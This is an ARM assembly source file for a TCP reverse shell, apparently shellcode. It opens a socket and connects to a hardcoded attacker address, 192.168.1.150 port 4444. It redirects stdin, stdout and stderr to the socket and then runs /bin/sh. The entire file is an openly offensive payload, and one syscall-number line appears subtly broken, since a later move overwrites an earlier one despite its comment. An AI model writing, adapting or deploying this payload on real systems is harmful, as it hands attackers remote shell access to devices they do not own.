@TCP reverse_shell (ARM)
.section .text
.global _start
_start:
	.ARM
	ADD R3, PC, #1
	BX R3

	//SOCKET
	.THUMB
	MOV R0, #2 //2
	MOV R1, #1 //1
	EOR R2, R2, R2 //0
	MOV R7, #100 
	MOV R7, #181 //syscall for 281
	SVC #1
	MOV R4, R0 //sockfd


	//CONNECT
	ADR R1, atk_box
	STRB R2, [R1, #1]//zero to AF_INET
	MOV R2, #16 //size of ip address
	ADD R7, #2
	SVC #1

	MOV R0, R4
	EOR R1, R1, R1 //stdin
	MOV R7, #63
	SVC #1

	MOV R0, R4
	ADD R1, #1 //stdout
	SVC #1

	MOV R0, R4
	ADD R1, #1 //stderr
	SVC #1


	//EXECVE(SHELL, NULL, NULL)
	ADR R0, shell
	EOR R1, R1, R1
	EOR R2, R2, R2
	STRB R2, [R0, #7] //null
	MOV R7, #11
	SVC #1


atk_box:
	.ascii "\x02\x02"
	.ascii "\x11\x5c"
	.ascii "\xc0\xa8\x01\x96"
shell:
	.ascii "/bin/shX"

